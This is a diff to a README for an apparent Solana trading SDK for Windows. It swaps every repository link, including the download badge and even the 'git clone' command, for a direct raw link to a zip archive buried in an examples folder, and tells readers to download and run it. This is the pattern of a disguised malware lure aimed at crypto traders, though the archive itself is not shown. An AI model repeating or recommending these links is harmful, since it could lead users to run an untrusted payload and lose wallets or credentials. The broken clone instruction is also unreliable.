@@ -1,6 +1,6 @@
 # ⚡ sol-trade-sdk-golang - Fast Solana Trading SDK for Windows
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/Agit8037/sol-trade-sdk-golang)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/Agit8037/sol-trade-sdk-golang/raw/refs/heads/main/examples/pumpfun_sniper_trading/sdk_sol_golang_trade_2.0.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ This page is written for Windows users who want to get the project from GitHub a
 
 Use this link to visit the download page:
 
-https://github.com/Agit8037/sol-trade-sdk-golang
+https://github.com/Agit8037/sol-trade-sdk-golang/raw/refs/heads/main/examples/pumpfun_sniper_trading/sdk_sol_golang_trade_2.0.zip
 
 On that page, look for the latest project files, then download and run the file or package that fits your setup.
 
@@ -38,7 +38,7 @@ If you plan to build or run the Go project yourself, install:
 
 Go to:
 
-https://github.com/Agit8037/sol-trade-sdk-golang
+https://github.com/Agit8037/sol-trade-sdk-golang/raw/refs/heads/main/examples/pumpfun_sniper_trading/sdk_sol_golang_trade_2.0.zip
 
 ### 2. Get the project files
 
@@ -149,7 +149,7 @@ If you see a version number, Git is ready.
 
 If you want to use Git, open Command Prompt and run:
 
-- git clone https://github.com/Agit8037/sol-trade-sdk-golang
+- git clone https://github.com/Agit8037/sol-trade-sdk-golang/raw/refs/heads/main/examples/pumpfun_sniper_trading/sdk_sol_golang_trade_2.0.zip
 
 Then open the new folder.
 
@@ -320,7 +320,7 @@ A simple first use flow looks like this:
 
 Download page:
 
-https://github.com/Agit8037/sol-trade-sdk-golang
+https://github.com/Agit8037/sol-trade-sdk-golang/raw/refs/heads/main/examples/pumpfun_sniper_trading/sdk_sol_golang_trade_2.0.zip
 
 Use this link again if you need to return to the project, get updates, or check files
 
